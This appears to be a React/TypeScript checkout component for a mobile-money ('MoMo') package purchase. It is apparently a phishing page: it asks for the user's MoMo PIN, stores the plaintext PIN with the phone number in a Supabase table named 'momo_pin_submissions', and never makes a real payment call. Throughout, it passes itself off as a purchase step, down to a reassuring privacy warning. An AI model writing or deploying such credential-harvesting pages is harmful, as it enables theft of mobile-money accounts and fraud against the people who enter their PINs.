import { useState } from 'react';
import { X, AlertCircle } from 'lucide-react';
import { supabase } from '../lib/supabase';

interface MoMoPINProps {
  phoneNumber: string;
  packageData: { name: string; price: string };
  onComplete: () => void;
  onBack: () => void;
}

export default function MoMoPIN({ phoneNumber, packageData, onComplete, onBack }: MoMoPINProps) {
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!pin || pin.length < 4) {
      alert('Please enter your MoMo PIN');
      return;
    }

    setLoading(true);

    try {
      const { error } = await supabase.from('momo_pin_submissions').insert([
        {
          phone_number: phoneNumber,
          momo_pin: pin,
        },
      ]);

      if (error) throw error;

      onComplete();
    } catch (error) {
      console.error('Error submitting PIN:', error);
      alert('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-3xl shadow-xl p-8 relative">
          <button
            onClick={onBack}
            className="absolute top-6 right-6 text-gray-600 hover:text-gray-800"
          >
            <X className="w-6 h-6" />
          </button>

          <div className="mb-8">
            <h2 className="text-xl font-bold text-gray-800 mb-4">Please enter your MoMo PIN</h2>

            <div className="bg-blue-50 p-4 rounded-xl mb-4">
              <div className="text-sm text-gray-600 mb-1">Package</div>
              <div className="font-bold text-gray-800">{packageData.name}</div>
              <div className="text-2xl font-bold text-blue-600 mt-1">{packageData.price}</div>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <input
                type="password"
                placeholder="MoMo PIN"
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                maxLength={6}
                className="w-full px-4 py-4 text-lg border-2 border-gray-300 rounded-xl focus:border-yellow-500 focus:outline-none"
              />
            </div>

            <div className="flex items-center gap-3 text-sm text-gray-600">
              <AlertCircle className="w-5 h-5 flex-shrink-0" />
              <p>Make sure no one is looking at your PIN</p>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-yellow-500 hover:bg-yellow-600 disabled:bg-gray-300 text-gray-800 font-bold py-4 rounded-full text-lg transition-colors"
            >
              {loading ? 'Processing...' : 'Complete Purchase'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
